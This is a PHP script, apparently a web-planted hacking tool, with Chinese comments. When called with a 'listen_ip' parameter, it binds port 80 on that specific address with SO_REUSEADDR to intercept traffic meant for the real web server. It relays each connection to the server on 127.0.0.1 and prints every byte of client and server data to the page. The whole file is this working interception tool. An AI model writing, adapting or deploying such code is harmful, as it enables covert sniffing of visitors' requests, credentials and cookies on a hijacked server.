<?php
class select
{
var $sockets;

// 构造函数
function select($sockets)
{
$this->sockets = array();

foreach($sockets as $socket)
{
$this->add($socket);
}
}

function add($add_socket)
{
//array_push($this->sockets, $add_socket);
$this->sockets[] = $add_socket;
}

// 利用临时数组来删除数组中的元素
function remove($remove_socket)
{
$tmp_sockets = array();

foreach($this->sockets as $socket)
{
if($remove_socket != $socket)
{
$tmp_sockets[] = $socket;
}
}

$this->sockets = $tmp_sockets;
}

// 检查socket数组是否可读，传入超时时间，返回socket数组
function can_read($timeout)
{
$read = $this->sockets;
socket_select( $read, $write = NULL, $except = NULL, $timeout );
return $read;
}

// 检查socket数组是否可写，传入超时时间，返回socket数组
function can_write($timeout)
{
$write = $this->sockets;
socket_select( $read = NULL, $write, $except = NULL, $timeout );
return $write;
}
}

// 网页不超时
set_time_limit(0);

// 即时输出数据，不缓冲
ob_end_clean();
ob_implicit_flush(true);

if( !isset($_GET["listen_ip"]) )
{
exit;
}
if( $_GET["listen_ip"] == "" )
{
exit;
}

$listen_ip = $_GET["listen_ip"];
$listen_port = 80;

// 建立socket
$listen_sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

// 设置重复绑定
socket_set_option($listen_sock, SOL_SOCKET, SO_REUSEADDR, 1);

// 明确指定绑定IP地址，优先获取数据
socket_bind($listen_sock, $listen_ip, $listen_port);

// 开始监听
socket_listen ($listen_sock);

echo "listen on ".htmlentities($listen_ip)." :".$listen_port."<br />";

// 创建socket数组，使用select来轮询
$check_socks = array($listen_sock);

// 映射客户端socket和服务端socket
// $socket_maps1将客户端socket作为key
// $socket_maps2将服务端socket作为key
// 以内存换速度，并且方便下面的搜索
$socket_maps1 = array( );
$socket_maps2 = array( );

// 实例化select类
$select = new select( $check_socks );

while(true)
{
/*
print_r( $socket_maps );
print "<br />";
*/
// select轮询，超时2秒
foreach ($select->can_read(1) as $socket)
{
// listen_sock可读，说明有人连接上来了
if( $socket == $listen_sock )
{
// 接受新连接，并加入到轮训数组
$new_client = socket_accept($listen_sock);
$select->add($new_client);

socket_getpeername($new_client, $ip, $port);
echo "New client connected: $ip, $port<br />";

// 建立到真实服务器的socket
$server_sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_connect($server_sock,"127.0.0.1", $listen_port);

// 建立真实服务器socket和真实客户端socket之间的映射关系
$socket_maps1[$new_client] = $server_sock;
$socket_maps2[$server_sock] = $new_client;

// 添加到select轮询中
$select->add($server_sock);

// $listen_sock的可读数据是因为有新连接，已经处理了。暂时去掉，因为下面开始处理数据转发
//select->remove( $listen_sock );
}

// 其他socket可读，表示有数据需要中转
else
{
// 读取数据，失败则从轮询socket中删除，并关闭socket
$client_data = @socket_read($socket, 1024, PHP_NORMAL_READ);
if ($client_data === false)
{
socket_close( $socket );
$select->remove( $socket );
echo "client disconnected.<br />";

continue;
}

// 如果socket在$socket_maps1的key中，说明是从客户端读到了数据
if( in_array( $socket, array_keys($socket_maps1) ) )
{
//echo "readed from client.<br />";
if( ! socket_write( $socket_maps1[$socket], $client_data ) )
{
socket_close( $socket );
socket_close( $socket_maps1[$socket] );
$select->remove( $socket );
$select->remove( $socket_maps1[$socket] );
print "Write to server error.<br />";
}
print htmlentities($client_data)."</b><br />";
}
// 否则如果socket在$socket_maps2的key中，说明是从真正的web服务器读到了数据
elseif( in_array( $socket, array_keys($socket_maps2) ) )
{
//echo "readed from server.<br />";
if( ! socket_write( $socket_maps2[$socket], $client_data ) )
{
socket_close( $socket );
socket_close( $socket_maps2[$socket] );
$select->remove( $socket );
$select->remove( $socket_maps2[$socket] );
print "Write to client error.<br />";
}
print htmlentities($client_data)."</b><br />";
}
}
}
}
?>